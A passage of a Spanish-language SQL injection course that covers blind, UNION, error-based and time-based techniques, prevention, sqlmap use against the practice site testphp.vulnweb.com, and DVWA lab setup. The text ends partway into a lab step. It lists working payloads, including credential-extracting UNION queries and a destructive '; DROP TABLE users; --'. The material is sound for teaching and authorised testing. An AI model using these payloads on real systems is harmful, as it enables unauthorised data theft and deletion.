Supongamos que el valor '1' anterior es un parámetro de consulta sin filtrar agregado a la consulta de la base de datos como en nuestro ejemplo anterior. Por tanto, un atacante puede controlar todo el texto después de 'ID='.

Un atacante puede agregar lo siguiente a la consulta para verificar que si incluye una condición falsa, verá generado contenido inusual:

| 1 | select post_status from wp_posts where ID=1 and 1=2 |

Obviamente, 1 no es igual a 2, por lo que en la consulta anterior la base de datos devolverá un conjunto de resultados vacío. El atacante examinará la página resultante y si es una página sin contenido o un mensaje de error que dice algo como "sin contenido", sabrá cómo se ve la respuesta de una consulta vacía con una condición falsa. Luego, el atacante puede incluir algo como lo siguiente:

| 1
2
3 | select post_status from wp_posts where ID=1
  and (select ID from wp_users where
  user_login='admin' and ID=1)
 |
| --- | --- |

La consulta anterior estará vacía si el usuario de la base de datos con ID 1 no tiene el nombre de usuario 'admin'. Sin embargo, devolverá un resultado normal no vacío al navegador si el usuario con ID 1 tiene el nombre de usuario "admin". Con esta técnica, un atacante puede extraer datos de una base de datos comprobando si hay respuestas vacías y no vacías de la aplicación.

Otro ejemplo de una consulta de inyección SQL ciega basada en contenido es:

| 1
2
3 | select post_status from wp_posts where
  ID=1 and (select 1 from wp_users where
  substring(user_pass,1,1) = 'a' and ID=1) |
| --- | --- |

La consulta anterior verificará si la primera letra de la contraseña hash para el usuario con ID 1 es una 'a'. Con esta técnica, un atacante puede revisar cada carácter y extraer la contraseña hash de las cuentas de administrador.

## Consecuencias

> Las consecuencias de una inyección SQL pueden incluir:
> 
- **Pérdida o alteración de datos:** el atacante puede eliminar, modificar o extraer información de la base de datos.
- **Inestabilidad del sistema:** el código malicioso puede causar que la base de datos deje de funcionar correctamente, lo que puede resultar en tiempos de inactividad y pérdida de disponibilidad.
- **Dificultad para detectar y mitigar el ataque:** debido a que el código malicioso se inserta en una consulta SQL legítima.
- **Posibilidad de propagación del ataque:** si el atacante tiene acceso a datos sensibles, como contraseñas de usuario, puede utilizarlos para propagar el ataque a otros sistemas.
- **Acceso no autorizado:** un atacante podría obtener acceso no autorizado al sistema o a la aplicación web, lo que le permitiría acceder a información confidencial o realizar acciones maliciosas en el sistema.
- **Modificación de datos:** un atacante podría modificar, eliminar o agregar datos al sistema, lo que podría tener graves consecuencias en la integridad y exactitud de los datos.
- **Ejecución de código malicioso:** un atacante podría ejecutar código malicioso en el sistema, lo que podría resultar en la toma de control del sistema o en el robo de información confidencial.
- **Denegación de servicio:** un atacante podría utilizar la inyección de comando para sobrecargar el sistema y hacer que se vuelva inoperable.
- **La no corrección de esta falla puede causar divulgación no autorizada de su información y la de sus clientes que podría dar lugar a fraude, usurpación de identidad y a sanciones reglamentarias.**
- Para evitar la inyección de comandos, es importante validar y filtrar todas las entradas de usuario en las aplicaciones web, y evitar el uso de comandos de shell en aplicaciones web. Además, es importante mantener todas las aplicaciones y sistemas actualizados y parcheados para evitar que se exploten vulnerabilidades conocidas.

## **Solución**

> Para prevenir y solucionar la inyección SQL avanzada, se pueden tomar las siguientes medidas:
> 
- **Validar y sanitizar todas las entradas de datos**: Asegúrese de que todas las entradas de datos, ya sean proporcionadas por los usuarios o por otras fuentes, sean validadas y sanitizadas adecuadamente antes de ser utilizadas en una consulta SQL.
- **Utilizar consultas parametrizadas:** En lugar de construir una consulta SQL dinámicamente utilizando cadenas de texto, utilice consultas parametrizadas que permitan que los parámetros sean pasados como argumentos separados. Esto reducirá la posibilidad de inyección SQL, ya que los valores de los parámetros son tratados como datos, no como parte de la consulta SQL.
- **Limitar los permisos de la base de datos:** Asegúrese de que los usuarios de la base de datos tengan solo los permisos necesarios para realizar sus funciones y nada más. Esto limitará el alcance de cualquier posible ataque.
- **Utilizar herramientas de seguridad y pruebas de penetración:** Realice pruebas regulares de seguridad y pruebas de penetración en la aplicación para identificar posibles vulnerabilidades y errores de seguridad. También puede utilizar herramientas de seguridad de terceros para proteger la aplicación contra la inyección SQL.
- Actualización y parcheo del software de la base de datos y uso de firewalls de aplicación web (WAF)

Es una tarea difícil determinar si una cadena de usuario es maliciosa o no. Por lo tanto, la mejor manera de hacerlo es “escapar” de los caracteres especiales en la entrada del usuario. Puede escapar una cadena antes de construir la consulta en PHP usando la función mysql_escape_string(). O en MySQL usando la función mysqli_real_escape_string().

Mientras se muestra la salida como HTML, también tendrá que convertir la cadena para asegurarse de que los caracteres especiales no interfieren con el marcado HTML. Puede convertir caracteres especiales en PHP usando la función htmlspecialchars(). Alternativamente, puede usar sentencias preparadas para evitar las inyecciones de SQL. Una sentencia preparada es una plantilla de una consulta SQL, en la que se especifican los parámetros en una etapa posterior para ejecutarla. Aquí hay un ejemplo de una declaración preparada en PHP y MySQLi.

`$query = $mysql_connection->prepare("select * from user_table where username = ? and password = ?");`

`$query->execute(array($username, $password));`

<aside>
📖 En resumen, para solucionar y prevenir la inyección SQL avanzada, es necesario validar y sanitizar todas las entradas de datos, utilizar consultas parametrizadas, limitar los permisos de la base de datos y utilizar herramientas de seguridad y pruebas de penetración.

</aside>

REFERENCIAS

- [https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [https://owasp.org/Top10/A03_2021-Injection/](https://owasp.org/Top10/A03_2021-Injection/)
- [https://owasp.org/www-project-web-security-testing-guide/v42/4Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [https://kinsta.com/es/blog/inyeccion-sql/](https://kinsta.com/es/blog/inyeccion-sql/)
- [https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html)

# **Pruebas de inyección SQL: todo lo que necesita saber**

Para mejorar sus habilidades de pentester de aplicaciones web, es importante aprender a detectar vulnerabilidades de inyección SQL. Profundizarwmoa en los principios y métodos de prueba que pueden descubrir los detalles de esta amenaza. Exploraremos técnicas de prueba manuales, como analizar URL y formularios, comprender la interacción del usuario y el procesamiento de aplicaciones.

Además, proporcionaremos ejemplos reales de cargas útiles de inyección SQL que puede utilizar en sus propias pruebas. Para mejorar aún más sus habilidades, cubriremos la automatización con herramientas como SQLmap y Burp Suite, que ofrecen información de expertos de la industria sobre técnicas modernas. También obtendrá conocimientos sobre la interpretación de mensajes de error complejos que son cruciales para identificar y resolver problemas. Al dominar las técnicas básicas y avanzadas descritas en este artículo, podrá mejorar la seguridad de sus aplicaciones y contribuir a un entorno digital más seguro.

## **Comprender las inyecciones SQL**

Las inyecciones SQL son una vulnerabilidad informática que puede afectar aplicaciones web y bases de datos que utilizan el lenguaje SQL. Estos ataques aprovechan las vulnerabilidades en los formularios de entrada y las URL dentro de las aplicaciones. Insertan intencionalmente declaraciones SQL dañinas en las solicitudes del servidor. El objetivo principal de un ataque de inyección SQL es controlar cómo funciona la base de datos. Esto permite el acceso no autorizado a datos confidenciales extrayéndolos, modificándolos o eliminándolos.

**Los ataques de inyección SQL se pueden dividir en varias categorías. Los más conocidos son:**

**Inyección basada en errores:** esta técnica implica insertar entradas dañinas en la base de datos de un sistema para provocar errores. Estos errores potencialmente pueden brindarle información útil.

![SQL 2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql2.png?raw=true)

**Inyección basada en unión:** el operador UNION le permite combinar los resultados de una consulta dañina y una consulta válida. Esto les permite acceder a datos de otras tablas sin permiso.

![SQL 3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql3.png?raw=true)

**Inyección ciega** : en este tipo de ataque, el perpetrador no recibe una respuesta directa del servidor. En cambio, infieren información sobre el comportamiento del sistema para recopilar datos.

![SQL 4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql4.png?raw=true)

**Inyección ciega basada en el tiempo** : esta técnica implica agregar intencionalmente retrasos a las consultas para verificar la precisión de condiciones específicas. Al analizar los mensajes de error, puede extraer información valiosa sobre la base de datos, lo que ayuda a una mayor explotación, como descubrir nombres de tablas o detalles del sistema, sin generar alarmas ni sospechas.

## **Pruebas manuales de inyección SQL**

Profundicemos ahora en las técnicas manuales de prueba de inyección SQL examinando de cerca la estructura de la URL. Al hacerlo, podemos identificar vulnerabilidades potenciales y explotarlas con fines de evaluación de seguridad.

**Analizando la estructura de la URL**

![SQL 5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql5.png?raw=true)

Durante el proceso de prueba manual de inyección SQL, un análisis profundo de la estructura de la URL es esencial para identificar y evaluar vulnerabilidades en las aplicaciones web. Este enfoque implica identificar debilidades en la aplicación inyectando intencionalmente código SQL malicioso a través de parámetros que se encuentran dentro de las URL.

Para analizar la vulnerabilidad de un sitio web a los ataques de inyección SQL, es importante identificar cualquier entrada del usuario que se transmita a través de los parámetros de la URL. Estos parámetros pueden servirle potencialmente como puntos de entrada. Una vez que se identifican estos parámetros, probar su manipulabilidad se vuelve crucial.

Esto implica insertar varias cadenas de prueba, caracteres especiales y secuencias de escape para determinar si la aplicación maneja adecuadamente dichas entradas sin generar errores.

![SQL 6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql6.png?raw=true)

Otro paso importante es examinar minuciosamente los mensajes de error que produce la aplicación. Estos mensajes pueden exponer inadvertidamente vulnerabilidades internas en el sistema, descubriendo potencialmente debilidades de inyección SQL.

Por ejemplo, en la imagen de arriba, puede ver un error generado al manipular el parámetro **de usuario** en la URL, lo que nos ayuda a identificar la **consulta SQL específica**  que está causando el error. Esto luego podría usarse para intentar explotar la vulnerabilidad que está causando el error o lanzar un ataque de denegación de servicio (DoS) en el sitio web enviando demasiadas consultas SQL no válidas.

Para profundizar más en las pruebas de este tipo de URL, puede intentar identificar dónde se inserta la entrada del usuario en la consulta SQL. Puede ser un campo de entrada, una variable en la URL o cualquier forma de entrada del usuario.

Para comenzar, puede utilizar una carga útil de SQL básica como esta:' OR '1'='1

Inserte esta carga útil en la entrada sospechosa y vea si el mensaje de error de SQL desaparece. Si el mensaje de error desaparece o se produce un comportamiento diferente, podría ser una señal de que el sitio es vulnerable a un ataque de inyección SQL. Si la carga útil básica no produce resultados significativos, es posible que desee experimentar con cargas útiles de SQL más avanzadas, como la inyección SQL ciega basada en UNION o basada en tiempo. Por ejemplo, una carga útil basada en UNION que podrías probar es: ' UNION

`SELECT null, username, password FROM users--`

Este tipo de carga útil intenta extraer información de la tabla de usuarios. Sin embargo, tenga cuidado al utilizar cargas útiles avanzadas como esta, ya que pueden afectar negativamente al sitio que está probando, si no se usan correctamente.

En resumen, analizar la estructura de la URL en las pruebas manuales de inyección SQL puede ayudar a identificar vulnerabilidades potenciales y evaluar la capacidad de una aplicación para manejar entradas maliciosas, brindándole datos importantes para continuar con su pentest.

## **Campos de formulario y mecanismos de validación**

Los campos de formulario en una aplicación web sirven como punto de entrada para la entrada del usuario. Puede explotar estos campos mediante inyecciones SQL, donde inyecta código SQL dañino. Estos campos de formulario se utilizan comúnmente para recopilar datos importantes del usuario, como nombres, direcciones de correo electrónico, contraseñas y más.

La combinación de campos de formulario bien diseñados con mecanismos de validación sólidos puede mitigar eficazmente el riesgo de inyecciones de SQL. Por ejemplo, un campo de correo electrónico debe aceptar estrictamente sólo direcciones de correo electrónico válidas, evitando la inserción de caracteres especiales que podrían manipular consultas SQL. Este no es siempre el caso y está sujeto a abuso.

Probar para ver si el formulario acepta caracteres especiales o entradas no típicas puede indicar la posibilidad de enviar comandos o solicitudes maliciosos a la base de datos.

![SQL 7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql7.png?raw=true)

Cuando se prueban manualmente las vulnerabilidades de inyección SQL, las medidas de seguridad existentes, como la validación de las entradas del usuario, a veces pueden impedir el proceso de inyección. En tales casos, vale la pena explorar cargas útiles básicas, como insertar **'OR 1=1--** en el campo de entrada; Este tipo de cargas útiles se denominan cargas útiles de omisión porque utilizan una condición que siempre es verdadera para manipular una entrada vulnerable y omitir la autenticación, acceder a datos no autorizados o ejecutar comandos maliciosos.

![SQL 8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql8.png?raw=true)

Si bien la validación de entradas es una salvaguarda importante, no siempre es infalible, por lo que para identificar posibles vulnerabilidades es esencial realizar pruebas completas y exhaustivas.

## **Valores de cookies y encabezados HTTP**

En las pruebas de inyección SQL manuales, puede manipular las solicitudes explotando los valores de las cookies y los encabezados HTTP de una aplicación web. Estos elementos se consideran entradas externas, por lo que es importante que realice pruebas adecuadas con las herramientas correctas (como Burp Suite).

Las cookies, que contienen información almacenada en el navegador de un usuario, pueden ser vulnerables a la manipulación. Un método común es inyectar código SQL dañino alterando los datos dentro de una cookie. Si se utiliza una cookie, por ejemplo, para almacenar una identificación de usuario en una aplicación, puede intentar modificar esa identificación dentro de la propia cookie. Este tipo de explotación podría dar lugar a un acceso no autorizado a datos o funciones sensibles.

<aside>
💡 Por ejemplo, considere una aplicación que utiliza una cookie para controlar al usuario que ha iniciado sesión actualmente. Ahora, supongamos que un hacker con intenciones maliciosas logra alterar esta cookie alterando el ID de usuario que contiene.

</aside>

Si la aplicación no aborda adecuadamente esta modificación, podría generar involuntariamente una consulta SQL dañina basada en el ID manipulado. Esto podría potencialmente otorgar acceso no autorizado a datos confidenciales.

Además, cuando un navegador envía una solicitud a una aplicación, incluye encabezados HTTP como User-Agents. Usted (el atacante) puede alterar estos encabezados insertando cadenas dañinas en las solicitudes. Por ejemplo, podría utilizar la siguiente carga útil:'UNION SELECT null, username, password FROM users--

Esta carga útil está diseñada para extraer datos de la tabla de "usuarios" de una base de datos. Supongamos que tiene una solicitud HTTP GET que incluye un parámetro "cat" en el que colocar la carga útil. En la pestaña "Solicitud HTTP" de Burp Suite, cambie el parámetro "cat" para que contenga la carga útil, por ejemplo:cat=' UNION SELECT null, username, password FROM users--

Comience a enviar la solicitud y observe la respuesta. Si el sitio es vulnerable a una inyección SQL basada en UNION, obtendrá una respuesta que incluye información de la tabla "usuarios".

![SQL 9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql9.png?raw=true)

En ambos casos, es esencial garantizar que la aplicación maneje de forma segura los valores de las cookies y los encabezados HTTP. Las pruebas manuales implican analizar el impacto de dichas manipulaciones en las entradas de la aplicación y verificar su respuesta a posibles ataques de inyección SQL.

**Entrada controlada por el usuario (UCI) procesada por la aplicación**

Cuando se prueban manualmente las vulnerabilidades de inyección SQL, el concepto de "Entrada controlada por el usuario" o UCI se refiere a cualquier entrada proporcionada por el usuario y posteriormente procesada por la aplicación. Esto puede incluir datos ingresados ​​en campos de formulario, valores de cookies, parámetros en URLs o encabezados HTTP (que ya vimos antes), puedes aprovechar estas oportunidades para inyectar código SQL malicioso y causar grandes daños.

En este enfoque, manipula intencionalmente la entrada proporcionada para insertar caracteres especiales o secuencias de escape (como ‘’ o =). Estas manipulaciones pueden alterar las consultas SQL generadas por la aplicación y explotar vulnerabilidades en su procesamiento de entrada. El objetivo es engañar a la aplicación para que ejecute consultas SQL no deseadas, lo que resulta en una extracción de datos no autorizada o en un compromiso del sistema.

### **Debe tener una lista de cargas útiles de inyección SQL**

Las cargas útiles son fragmentos de código que se insertan intencionalmente en los campos de entrada de las aplicaciones web. Estos fragmentos tienen como objetivo explotar las vulnerabilidades en los sistemas de gestión de bases de datos. Los profesionales de la seguridad y los evaluadores de penetración suelen utilizar estas herramientas para evaluar el nivel de resistencia que tiene una aplicación contra posibles ataques. A continuación, se muestra una lista de las cargas útiles de

inyección SQL más comunes utilizadas por **Pentesters**  y **Bug Bounty Hunters**  (en un contexto de piratería ética) para probar manualmente formularios en busca de vulnerabilidades de inyección SQL:

- payload de inyección SQL básica: **' OR '1'='1** (se utiliza para omitir la autenticación ingresando una condición que siempre es verdadera).
- Recuperar información: **' UNION SELECT null,username,password FROM users--** (Se utiliza para extraer datos confidenciales como nombre de usuario y contraseña de la base de datos).
- Manipulación de consultas: **'; DROP TABLE users; --** (Se utiliza para provocar la eliminación de la tabla "usuarios").
- Obtener los nombres de las tablas: **' AND 1=0 UNION SELECT table_name, null FROM information_schema.tables--** (Se utiliza para extraer los nombres de las tablas en la base de datos).
- Extraer nombre de la base de datos: **' AND 1=0 UNION SELECT null, database()--** (Se utiliza para extraer el nombre de la base de datos actual).
- Uso de UNION para extraer datos: **' UNION SELECT username, password FROM users--** (Se utiliza para extraer datos confidenciales mediante una operación UNION).
- Uso de comentarios para omitir: **admin' --** (Utiliza un comentario para omitir el resto de la entrada e iniciar sesión como administrador).
- Uso de SQLi ciego basado en tiempo: **' OR IF(1=1, SLEEP(5), 0)--** (Retrasa la respuesta del servidor para confirmar la vulnerabilidad de inyección SQL).
- Uso de SQLi basado en errores: **' AND 1=CONVERT(int, (SELECT @@version))--** (fuerza un error de SQL a revelar información de la base de datos).

Todas estas cargas útiles se pueden usar (y son las más efectivas) en **formularios de inicio de sesión** vulnerables , **URL** (usadas como consultas maliciosas) y **solicitudes** (capturadas y modificadas por usted con la carga útil correcta).

### **Pruebas automatizadas de inyección de SQL**

Cuando se trata de seguridad de la información, herramientas como SQLmap y Burp Suite gozan de gran prestigio en el campo de las pruebas de inyección SQL.

### **Descripción general de las herramientas: SQLmap y Burp Suite**

Estas herramientas son ampliamente utilizadas por los profesionales de la seguridad y brindan soluciones automatizadas efectivas para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Si bien SQLmap se especializa en pruebas y automatización avanzadas, Burp Suite ofrece un ecosistema completo para analizar la seguridad de las aplicaciones. Permite a los expertos identificar, evaluar y abordar vulnerabilidades críticas, incluidas aquellas relacionadas con ataques de inyección SQL.

Ahora veamos en detalle para qué sirven estas herramientas y para qué se utilizan:

- **SQLmap** : es una valiosa herramienta de código abierto que automatiza las pruebas de inyección de SQL. Detecta vulnerabilidades de forma eficaz, extrae datos y compromete los sistemas de bases de datos utilizando una variedad de cargas útiles y técnicas. Los probadores de penetración dependen principalmente de SQLmap para evaluar la seguridad de las aplicaciones.

![SQL 10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql10.png?raw=true)

- **Burp Suite** : es un conjunto completo de herramientas diseñadas para la seguridad de aplicaciones web. Entre sus características, la herramienta incluye un módulo de Seguridad de Aplicaciones Web (WAS), que ayuda a los especialistas en seguridad a identificar y abordar vulnerabilidades en sitios web. Este módulo puede detectar amenazas de seguridad comunes que incluyen, como es de esperar, ataques de inyección SQL.

![SQL 11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql11.png?raw=true)

### **Ejecución de SQLmap para buscar y explotar inyecciones de SQL**

Ahora, usemos SQLmap para descubrir sistemáticamente vulnerabilidades de inyección SQL en un sitio web deliberadamente vulnerable. Nuestro objetivo será VulnWeb ( http://testphp.vulnweb.com ), un sitio web diseñado específicamente para que los estudiantes de Seguridad Cibernética aprendan atacando y explotando sus vulnerabilidades.

Si encuentra una URL web como, en este caso, [http://testphp.vulnweb.com/listproducts.php](http://testphp.vulnweb.com/listproducts.php)? **cat=1** , donde el parámetro 'GET' está resaltado, podría indicar que el sitio web es susceptible a ataques de inyección SQL. En tales casos, es posible que pueda acceder a información confidencial de la base de datos. Se sabe que SQLmap es el más eficaz en escenarios que involucran sitios web basados ​​en PHP.

![SQL 12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql12.png?raw=true)

**Paso 1: Evaluación del parámetro de la URL**

Una forma sencilla de determinar si su sitio web es vulnerable es reemplazar el valor en el parámetro de solicitud de obtención con un *****  (asterisco).

![SQL 13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql13.png?raw=true)

Este tipo de error sugiere que el sitio web es vulnerable a algún tipo de ataques de inyección SQL.

**Paso 2: comprobar la URL con SQLmap**

Necesitamos ingresar la URL web deseada que debe verificarse, usando el parámetro -u . Generalmente el objetivo principal es determinar si es posible acceder a una base de datos, por lo que podemos utilizar la opción --dbs  para este propósito. Al utilizar --dbs, podemos obtener una lista de todas las bases de datos disponibles.

El primer comando será:

`sqlmap -u [http://testphp.vulnweb.com/listproducts.php?cat=1](http://testphp.vulnweb.com/listproducts.php?cat=1) --dbs`

![SQL 14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql14.png?raw=true)

**Paso 3: comprender el resultado**

En el resultado anterior, puede ver en amarillo las partes donde SQLmap encontró vulnerabilidades de inyección SQL y en naranja las mejores cargas útiles, sugeridas por SQLmap, para usar ese tipo específico de inyección SQL (por ejemplo, la primera vulnerabilidad encontrada es una vulnerabilidad booleana). **Inyección SQL ciega** basada y la carga útil sugerida es: cat-1 AND 1050-1050). Tomemos, por ejemplo, la última parte del resultado, resaltada en amarillo, que dice: “El parámetro GET **'cat'** es ' **Consulta UNION genérica** '.

Esta parte del resultado nos dice que el parámetro "cat" de una solicitud GET (que es el tipo de solicitud web que, en este caso, SQLmap está usando para probar la URL) dentro de "[http://testphp.vulnweb.com](http://testphp.vulnweb.com/) /listaproductos.php? **cat** =1” es vulnerable a una consulta UNION genérica.

**Pero ¿qué es una consulta UNION Genérica?**

Es un ataque que normalmente implica manipular la consulta SQL para combinar los resultados de 2 o más tablas de bases de datos, lo que le permite obtener acceso no autorizado a datos confidenciales. En resumen, este resultado de SQLmap sugiere que se necesitan más pruebas para confirmar si el parámetro **'cat'** es realmente vulnerable a un ataque de inyección SQL de "consulta UNION genérica". Es una señal para investigar y potencialmente explotar una vulnerabilidad en la validación de entrada de la aplicación (que es la parte de la aplicación web que verifica y permite la entrada del usuario según la consulta utilizada).

Y es por eso que podemos ver, en el último resultado resaltado en naranja, que SQLmap sugiere una carga útil específica, para probar manualmente el sitio web vulnerable para ese tipo de ataque de inyección SQL.

## **Análisis de mensajes de error**

Durante el proceso de análisis de errores en las pruebas de inyección SQL, los errores generados por una aplicación pueden ofrecer información importante sobre la existencia de vulnerabilidades. Por ejemplo, los mensajes de error que contienen información confidencial como nombres de tablas, errores flagrantes de sintaxis SQL en los comentarios de la aplicación y respuestas inconsistentes, como resultados faltantes o duplicados, pueden indicar una posible manipulación de la consulta.

![SQL 15](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/sql15.png?raw=true)

Estos mensajes de error pueden ofrecer información valiosa sobre el funcionamiento interno del sistema. Para activar estos mensajes, se pueden ingresar intencionalmente datos maliciosos que provoquen que las consultas fallen. En la imagen de arriba, puede ver un error de sintaxis SQL (que ya mencionamos antes) que aparece después de cambiar el valor del parámetro **cat de " 1** " a ***** (ejemplo de entrada maliciosa).

Si encuentra errores de sintaxis SQL, como el comúnmente visto "Tiene un error en su sintaxis SQL" (que podemos ver en la imagen), generalmente significa que la entrada se incluye directamente en las consultas sin la verificación adecuada. Este tipo de errores a menudo indican un comportamiento interno del sistema y ayudan a los expertos en seguridad a identificar posibles debilidades en las aplicaciones.

## **Preguntas frecuentes**

- **¿Es ilegal realizar pruebas de inyecciones de SQL?**

La legalidad de cualquier Pentest depende únicamente de las leyes locales y federales de su país, por lo que es una buena práctica estar informado sobre ellas antes de realizar cualquier tipo de prueba activa. Sin embargo, no debería haber ningún problema siempre que la actividad se realice de manera responsable y en plataformas donde se haya obtenido el **permiso por escrito**  del propietario.

- **¿Qué son las técnicas de inyección SQL?**

Existen varias técnicas que se pueden utilizar para manipular consultas, como ataques UNION, ataques basados ​​en tiempo y ataques basados ​​en errores. Estas técnicas implican el uso de datos maliciosos para explotar vulnerabilidades.

- **¿Cuál es la mejor herramienta de inyección SQL?**

Para fines de automatización, SQLmap se utiliza ampliamente, mientras que Burp Suite ofrece una solución versátil para análisis de seguridad.

- **¿Necesito aprender SQL para inyecciones de SQL?**

Tener algunos conocimientos de SQL puede resultar útil, pero también hay herramientas disponibles que pueden simplificar el proceso de identificación de vulnerabilidades.

## **Inyección SQL ciega**

La inyección ciega de SQL, una forma sigilosa y astuta de ataque de inyección de SQL, plantea un desafío único para los profesionales de la seguridad debido a su naturaleza esquiva y su dificultad de detección y explotación. En este completo artículo, profundizaremos en el mundo de la inyección SQL ciega y descubriremos los matices sutiles que la distinguen de otros ataques de inyección SQL.

A lo largo del artículo, analizaremos varias herramientas y métodos, centrándonos en Kali Linux como nuestra plataforma preferida, aunque puede utilizar las herramientas mencionadas en la mayoría de los sistemas operativos. A medida que concluimos, le brindaremos un conjunto de mejores prácticas probadas para defender sus aplicaciones web contra estos ataques esquivos y potencialmente dañinos. Al final de este artículo, estará bien versado en cómo comprender, explotar y defenderse contra las vulnerabilidades de inyección SQL ciega.

Ahora, profundicemos en esta guía detallada y prepárese con los conocimientos y técnicas esenciales para abordar de manera efectiva los desafíos que plantea este tipo de vulnerabilidad.

### **¿Qué es la inyección SQL ciega?**

La inyección SQL es una vulnerabilidad frecuente de las aplicaciones web que ocurre cuando un atacante logra ejecutar **código SQL** no autorizado en la base de datos de una aplicación web. Los atacantes hacen esto insertando declaraciones SQL maliciosas en los campos de entrada del usuario, como cuadros de búsqueda o formularios de inicio de sesión. Cuando tiene éxito, un atacante puede obtener información confidencial de la base de datos, modificar o eliminar datos e incluso ejecutar comandos administrativos.

La inyección ciega de SQL, una variante más oculta, ocurre cuando el atacante **no puede ver directamente el resultado** de sus consultas inyectadas. En este caso, deben deducir los resultados indirectamente utilizando técnicas basadas en contenido o en tiempo. Este tipo de ataque se utiliza cuando la aplicación no muestra visiblemente los resultados de una consulta SQL inyectada, lo que dificulta que el atacante confirme el éxito de sus acciones.

El beneficio de utilizar la inyección SQL ciega sobre un ataque de inyección SQL estándar radica en su sutileza. Dado que el atacante no ve directamente el resultado, puede resultar más difícil para los sistemas de seguridad o los administradores detectar el ataque. El atacante suele utilizar respuestas condicionales ( **basadas en booleanos** ) o retrasos en el tiempo de respuesta de la aplicación ( **basadas en tiempos** ) para inferir si el código SQL inyectado ha tenido el efecto deseado.

Al recopilar lenta y metódicamente información sobre la estructura y el contenido de la base de datos, un atacante aún puede explotar una vulnerabilidad de inyección SQL ciega para acceder a datos confidenciales y manipular el sistema sin levantar sospechas inmediatas.

## **Descargo de responsabilidad**

Queremos ser absolutamente claros sobre la importancia de cumplir con las leyes aplicables con respecto al escaneo y la explotación de vulnerabilidades de aplicaciones web. Antes de realizar cualquier forma de piratería ética o prueba de penetración en un sistema, **asegúrese de haber obtenido el permiso explícito** del sistema o del propietario de la red.

La piratería o el escaneo no autorizados pueden parecer triviales, pero pueden acarrear graves consecuencias legales, incluidas multas o prisión, según su jurisdicción. **No lo hagas.** Algunas de las leyes que rigen esta actividad incluyen:

- La Ley de Abuso y Fraude Informático (Estados Unidos)
- Secciones 184, 342.1, 380 y 430 del Código Penal de Canadá (Canadá)
- Ley de uso indebido de computadoras de 1990 (Inglaterra)
- Segundo. 202a y 202b del Código Penal alemán (Alemania)
- Ley de Tecnología de la Información Sec. 43 y 66 (India)
- Ley sobre la prohibición del acceso no autorizado a ordenadores (Japón)

 Si duda si está actuando con claridad, consulte el acuerdo o el alcance de sus actividades autorizadas con una entidad específica o revise el código de conducta o las pautas de divulgación con cualquiera de los programas de recompensas por errores mencionados al final de este artículo.

## **Descubriendo y explotando SQLi ciego**

Ahora que tiene un conocimiento sólido de la inyección SQL ciega y en qué se diferencia de la inyección SQL normal, profundicemos en el **proceso de descubrir** y explotar estas vulnerabilidades.  Primero, lo guiaremos en la configuración de su entorno de laboratorio, luego realizaremos pruebas manuales de inyección ciega de SQL y, finalmente, usaremos herramientas como SQLMap y Burp Suite para agilizar el proceso de explotación.

### **Configurando su laboratorio**

Para comenzar, deberá configurar su laboratorio para descubrir y explotar vulnerabilidades de inyección SQL ciega. Hay **varias herramientas que puede utilizar** y usaremos las siguientes herramientas y recursos:

**Maldita aplicación web vulnerable (DVWA):** DVWA es una aplicación web intencionalmente vulnerable que proporciona un entorno seguro para practicar diversas técnicas. **Viene preinstalado en Kali Linux** o puedes descargarlo con sudo apt install dvwa. Una vez instalado, establezca el nivel de dificultad en "bajo" o "medio" y navegue hasta el desafío "Inyección SQL (ciega)". Usaremos esto para simular un escenario del mundo real y demostrar métodos de prueba. Para iniciar la aplicación DVWA:

1. Abra la terminal y escriba el comando: dvwa-start.
2. Si no está en la cuenta raíz, se le pedirá que lo permita.
3. El navegador debería abrirse automáticamente en DVWA.
4. (Alternativamente) Si no se abre, vaya al navegador e ingrese: **[http://127.0.0.1:42001](http://127.0.0.1:42001/)**en la barra de direcciones.
5. Para detener el servidor DVWA, regrese a la terminal y escriba el comando: dvwa-stop.

**SQLMap:** esta poderosa herramienta de código abierto automatiza la detección y explotación de vulnerabilidades de inyección SQL. **Viene preinstalado en Kali Linux** , por lo que si ese es el sistema operativo que estás usando, no necesitas descargarlo por separado. Usaremos SQLMap para automatizar la explotación de la vulnerabilidad de inyección SQL ciega descubierta en DVWA.

**Burp Suite:** Burp Suite es un conjunto de herramientas de prueba de seguridad de aplicaciones web ampliamente utilizado. Para este artículo, usaremos la Community Edition, **que viene preinstalada en Kali Linux** . Esto se utilizará para interceptar las solicitudes realizadas a la DVWA. Demostraremos un método alternativo de prueba con SQLMap capturando una solicitud con Burp, guardándola como un archivo de texto y luego ejecutándola a través de SQLMap. Se recomienda que sólo ejecute DVWA u otras aplicaciones intencionalmente vulnerables en un entorno virtual.

## **Pruebas de inyección SQL ciega**

La detección de una inyección SQL ciega implica enviar consultas que producen respuestas condicionales o retrasan el tiempo de respuesta del servidor. Lo guiaremos a través de cada paso del proceso para que pueda realizar pruebas exhaustivas de inyección SQL ciega y comprender el razonamiento o el comportamiento detrás de cada acción. Como nota, la estructura de consulta exacta o los comandos pueden variar según la base de datos utilizada. Se demuestra MySQL.

**Paso 1: respuesta normal**

